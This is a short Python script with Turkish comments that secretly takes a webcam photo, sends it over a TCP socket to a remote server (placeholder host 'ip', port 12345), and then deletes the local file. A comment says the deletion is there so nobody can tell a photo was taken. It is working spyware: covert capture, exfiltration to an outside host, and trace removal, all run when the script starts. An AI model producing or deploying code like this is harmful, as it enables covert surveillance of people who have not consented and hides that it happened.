import cv2
import socket
import os

def take_photo():
    # Video akışı için bir VideoCapture nesnesi oluştur
    cap = cv2.VideoCapture(0)

    # Kamera başlatılamazsa hata mesajı göster ve çık
    if not cap.isOpened():
        print("Kamera başlatılamadı!")
        return

    # Fotoğraf çek
    ret, frame = cap.read()

    # Eğer fotoğraf çekilemediyse hata mesajı göster ve çık
    if not ret:
        print("Fotoğraf çekilemedi!")
        return

    # Fotoğrafı web.png olarak kaydet
    cv2.imwrite('web.png', frame)

    # Kamerayı serbest bırak
    cap.release()
    # OpenCV penceresini kapat
    cv2.destroyAllWindows()

    print("Fotoğraf başarıyla kaydedildi!")

    # Sunucu bilgileri
    HOST = 'ip'
    PORT = 12345

    # Dosya adı
    filename = 'web.png'

    # Socket oluştur
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        # Dosya adını gönder
        s.sendall(filename.encode())
        # Dosyayı gönder
        with open(filename, 'rb') as f:
            print('Dosya gönderiliyor...')
            data = f.read(1024)
            while data:
                s.send(data)
                data = f.read(1024)
        print('Dosya gönderildi.')


    os.remove(filename) #fotoraf çekildiği belli olmasın diye siliyoruz


# Fonksiyonu çağır
take_photo()
